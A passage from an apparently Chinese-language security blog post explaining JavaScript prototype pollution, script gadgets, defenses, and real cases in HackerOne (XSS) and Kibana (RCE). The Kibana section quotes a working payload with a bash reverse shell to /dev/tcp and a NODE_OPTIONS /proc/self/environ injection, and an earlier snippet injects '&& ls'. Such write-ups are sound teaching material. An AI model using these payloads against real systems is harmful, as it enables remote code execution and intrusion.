@@ -1,0 +1,200 @@
+``` js
+const child_process = require('child_process')
+const params = ['123 && ls']
+Object.prototype.shell = true // 只多了這行，參數的解析就會不一樣
+const result = child_process.spawnSync(
+  'echo', params, {timeout: 1000}
+);
+console.log(result.stdout.toString())
+/*
+123
+index.js
+node_modules
+package-lock.json
+package.json
+*/
+```
+
+之所以會這樣，是因為 `child_process.spawn` 的第三個參數 options 中有一個選項叫做 `shell`，設為 true 以後會造成行為不同，而官網的[文件](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options)也有寫說：
+
+> If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.
+
+透過 prototype pollution 搭配 script gadget（`child_process.spawn`），成功製造出一個嚴重性極高的漏洞。
+
+## 中場總結
+
+如果程式中存在某個功能，能讓攻擊者污染到 prototype 上面的屬性，這個漏洞就叫做 prototype pollution，而 prototype pollution 本身用途不大，需要跟其他的程式碼結合才能發揮作用，而可以跟他結合的程式碼就叫做 script gadget。
+
+例如說 Vue 的內部實作會根據某個物件的 `template` 這個屬性渲染出相對應的東西，於是我們只要污染 `Object.prototype.template`，就可以製造出一個 XSS 漏洞。或像是 `child_process.spawn` 用到了 `shell`，所以污染它以後就變成了 RCE 漏洞。
+
+要修復的其實並不是那些可以利用的 script gadget，除非你把每個物件取值的地方都改掉，但這其實也不是根治的方式。真正根治的方式，是杜絕掉 prototype pollution，讓 prototype 不會被污染，就沒有這些問題了。
+
+## 該如何防禦
+
+在 [snyk](https://snyk.io/vuln/SNYK-JS-SWIPER-1088062) 的任何一個 prototype pollution 漏洞頁面上都會有防禦建議，也可以參考這一篇：[Prototype pollution attack in NodeJS application](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
+
+常見的防禦方式有幾種，第一種是在做這些物件的操作時，阻止 `__proto__` 這個 key，例如說前面提到的解析 query string 跟 merge object 都可以採用這個方式。
+
+但是除了 `__proto__` 以外，也要注意另外一種繞過方式，像這樣：
+
+``` js
+var obj = {}
+obj['constructor']['prototype']['a'] = 1
+var obj2 = {}
+console.log(obj2.a) // 1
+```
+
+用 `constructor.prototype` 也可以去污染原型鏈上的屬性，所以要把這幾種一起封掉才安全。
+
+像是 [lodash.merge](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad) 的 prototype pollution 就是用這種方式修復的，當 key 是 `__proto__` 或是 `prototype` 的時候會做特殊處理。
+
+第二種方式簡單易懂，就是不要用 object 了，或更精確地說，「不要用有 prototype 的 object」。
+
+有些人可能看過一種建立物件的方式，是這樣的：`Object.create(null)`，這樣可以建立出一個沒有 `__proto__` 屬性的空物件，就是真的空物件，任何的 method 都沒有。也因為這樣，所以就不會有 prototype pollution 的問題：
+
+``` js
+var obj = Object.create(null)
+obj['__proto__']['a'] = 1 // 根本沒有 __proto__ 這個屬性
+// TypeError: Cannot set property 'a' of undefined
+```
+
+像是開頭提到的解析 query string 的 library，其實已經用了這種方式來防禦，像是每週下載次數高達 1 千萬次的 [query-string](https://www.npmjs.com/package/query-string)，[文件](https://github.com/sindresorhus/query-string#parsestring-options)上面就寫了：
+
+> .parse(string, options?)
+> Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.
+>  
+> The returned object is created with Object.create(null) and thus does not have a prototype.
+
+其他還有像是建議用 `Map` 來取代 `{}`，但我覺得目前大家還是習慣用 object 居多，我自己覺得 `Object.create(null)` 會比 Map 好用一點。
+
+或是用 `Object.freeze(Object.prototype)`，把 prototype 凍結住，就沒辦法去修改：
+
+``` js
+Object.freeze(Object.prototype)
+var obj = {}
+obj['__proto__']['a'] = 1
+var obj2 = {}
+console.log(obj2.a) // undefined
+```
+
+但 `Object.freeze(Object.prototype)` 的問題之一是假設某個第三方套件有去修改 `Object.prototype`，比如說為了方便直接在上面加一個屬性，那就會比較難 debug，因為 freeze 之後去修改並不會造成錯誤，只是不會修改成功而已。
+
+所以你可能會發現你的程式因為某個第三方套件壞掉了，但你不知道為什麼。還有一個我想到的可能風險是 polyfill，假設未來因為版本問題需要幫 `Object.prototype` 加上 polyfill，就會因為 freeze 的關係而失效。
+
+至於 Node.js，還可以使用 `--disable-proto` 這個 option 來把 `Object.prototype.__proto__` 關掉，詳情可以參考[官方文件](https://nodejs.org/api/cli.html#cli_disable_proto_mode)
+
+或是未來也有可能使用 document policy 做處理，可以關注這個 issue： [Feature proposal: Mitigation for Client-Side Prototype Pollution](https://github.com/WICG/document-policy/issues/33)
+
+## 實際案例
+
+最後我們來看兩個 prototype pollution 的真實案例，讓大家更有感覺一點。
+
+第一個案例是知名 bug bounty 平台 hackerone 的漏洞（對，就是 bug bounty 平台本身的漏洞），完整報告在這裡：[#986386 Reflected XSS on www.hackerone.com via Wistia embed code](https://hackerone.com/reports/986386)
+
+在網站上他們用了一個第三方套件，而在這個第三方套件裡面有一段程式碼長這樣：
+
+``` js
+i._initializers.initWLog = function() {
+    var e, t, n, o, a, l, s, d, u, p, c;
+    if (t = i.url.parse(location.href),
+    document.referrer && (u = i.url.parse(document.referrer)),
+``` 
+
+它會去解析 `location.href` 跟 `document.referrer`，這兩者都是攻擊者可控的，然後 `i.url.parse` 這個 function 有著 prototype pollution 的漏洞，所以可以污染任意屬性。
+
+污染之後，作者發現了另外一段程式碼，這一段程式碼跟我們前面寫過的 `createElement` 有異曲同工之妙，`fromObject` 會去遍歷屬性然後放到 DOM 上：
+
+``` js
+if (this.chrome = r.elem.fromObject({
+    id: r.seqId('wistia_chrome_'),
+    class: 'w-chrome',
+    style: r.generate.relativeBlockCss(),
+    tabindex: -1
+})
+```
+
+所以只要污染 `innerHTML`，就可以利用這個 script gadget 製造出一個 XSS 漏洞。實際的攻擊方式就是構造出一個能夠觸發 prototype pollution + XSS 的網址，只要把網址傳給別人，點開以後就會直接遭受到攻擊。
+
+這攻擊後半段還有繞過 CSP 的段落，用的是之前我在 [從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦](https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/)中有提過的技巧。
+
+另一個案例是 Kibana 的漏洞，原始文章在這裡：[Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)，官方對於這個漏洞的描述是這樣的：
+
+> An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.
+
+在 Kibana 裡面有一個 Timelion 的功能，可以自己輸入語法並且畫成圖表，而下面這一段語法可以污染 prototype：
+
+``` js
+.es.props(label.__proto__.x='ABC')
+```
+
+污染 prototype 只是第一步，下一步是要找出 script gadget，kibana 中的其中一段程式碼長這樣子：
+
+``` js
+  var env = options.env || process.env;
+  var envPairs = [];
+
+  for (var key in env) {
+    const value = env[key];
+    if (value !== undefined) {
+      envPairs.push(`${key}=${value}`);
+    }
+  }
+```
+
+這一段會來拿構造環境變數，而這個環境變數會用來跑新的 node process，例如說 envPairs 如果是 `a=1` 的話，應該就會跑 `a=1 node xxx.js` 這個指令。
+
+既然是跑 node.js，我們可以利用 `NODE_OPTIONS` 這個環境變數來偷偷引入檔案：
+
+``` js
+// a.js
+console.log('a.js')
+
+// b.js
+console.log('b.js')
+
+// 跑這個指令，用環境變數引入 a.js
+NODE_OPTIONS="--require ./a.js" node b.js
+
+// 輸出
+a.js
+b.js
+```
+
+所以，如果我們可以上傳一個 js 檔案，就可以搭配 prototype pollution 去執行這個檔案了。聽起來有點麻煩，有其他方法嗎？
+
+有！有一個滿常用的技巧是有些檔案的內容其實是可控的，例如說 PHP 中的 session 內容就有機會控制，可參考這一篇：[透過 LFI 引入 PHP session 檔案觸發 RCE](https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce)，而另一個 Linux 系統中的檔案 `/proc/self/environ` 則是會有現在的 process 的所有環境變數。
+
+如果我們建立一個環境變數叫做 `A=console.log(123)//`，`/proc/self/environ` 的內容就會變為：
+
+``` js
+A=console.log(123)//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....
+```
+
+就變成了合法的 JS 程式碼！
+
+於是就可以利用這樣的方式去執行它：
+
+``` js
+NODE_OPTIONS="--require /proc/self/environ" A='console.log(1)//' node b.js
+```
+
+作者最後給出的 code 長這樣：
+
+``` js
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
+.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+```
+
+污染了兩個不同的屬性，創造了兩個環境變數，一個用來把 `/proc/self/environ` 變成合法的 JS 並且包含了要執行的程式碼，另一個 `NODE_OPTIONS` 則透過 `--require` 去引入 `/proc/self/environ`，最後就串成了可以執行任意程式碼的 RCE 漏洞！
+
+## 結語
+
+我自己在接觸資安以前，是沒有聽過 prototype pollution 的。
+
+因此當我第一次接觸到 prototype pollution 這個漏洞的時候，我覺得有些驚訝。我驚訝的點在於，為什麼我從來沒聽過這個？比起前端常見的漏洞像是 XSS 或是 CSRF 等等，prototype pollution 的知名度似乎低了許多。
+
+有些人第一次看到這名詞可能是因為某個 NPM 的 package 有這個漏洞，升級版本以後就修掉了，但可能沒有去理解這個漏洞的成因以及可能的影響。
+
+我自己其實滿愛這個漏洞的，第一是我覺得成因很有趣，第二是我覺得尋找 script gadget 也很有趣。總之呢，希望能藉由這篇文章，讓更多前端工程師認識到這個漏洞，並且知道它的原理以及防禦方式。
+
+最後推薦大家一篇超讚的文章，透過自動化的方式去檢測 prototype pollution 漏洞，並且找出發生問題的地方，我覺得把 prototype pollution 又提升到了另一個境界：[A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)
